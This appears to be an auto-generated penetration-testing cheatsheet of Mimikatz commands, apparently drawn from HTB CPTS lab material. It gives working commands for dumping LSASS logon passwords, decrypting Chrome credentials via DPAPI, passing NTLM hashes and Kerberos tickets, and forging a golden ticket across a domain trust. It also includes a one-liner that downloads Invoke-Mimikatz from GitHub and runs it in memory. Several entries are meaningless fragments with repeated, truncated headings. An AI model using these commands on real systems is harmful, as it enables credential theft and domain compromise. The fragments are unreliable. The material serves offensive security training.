# Mimikatz

% mimikatz, lsass, cpts

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - for-dpapi
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely

```
mimikatz.exe
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - for-dpapi-2
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely

```
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - dump-hashes-with-mimikatz
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - run-as-with-mimikatz
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
C:\Tools\mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - powershell-downloadstring---fileless-method
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - mimikatz-windows
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - mimikatz
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
PtH

```
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - mimikatz-2
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
PowerShell Remoting

```
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - extracting-tickets-from-memory-with-mimikatz
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
mimikatz # base64 /out:true
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - extracting-tickets-from-memory-with-mimikatz-2
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
mimikatz # kerberos::list /export
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - extracting-tickets-from-memory-with-mimikatz-3
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
====================
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - extracting-tickets-from-memory-with-mimikatz-4
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - background
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform late

```
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - creating-a-golden-ticket-with-mimikatz
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - creating-a-golden-ticket-with-mimikatz-2
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
Attacking Domain Trusts - Child -> Parent Trusts - from Windows

```
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
(Meterpreter 1)(C:\) > shell
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-3
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
mimikatz # privilege::debug
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-4
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
mimikatz # sekurlsa::logonpasswords
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - what-is-this-users-cleartext-password
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
Students will then attain a `PowerShell` session as the user `adunn`: Afterward, students will need to change directories to `C:\Tools\mimikatz\x64\`:

```
cd C:\Tools\mimikatz\x64\
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - what-is-this-users-cleartext-password-2
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
And then, students need to run `mimikatz`:

```
.\mimikatz.exe
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - what-is-this-users-cleartext-password-3
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
```
mimikatz #
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - sedebugprivilege
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on loc

```
mimikatz # log
```

## Mimikatz - Mimikatz - Mimikatz - Mimikatz - Mimikatz - sedebugprivilege-2
#cat/POSTEXPLOIT/CREDS_RECOVER #cpts
This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on loc

```
mimikatz # sekurlsa::minidump lsass.dmp
```

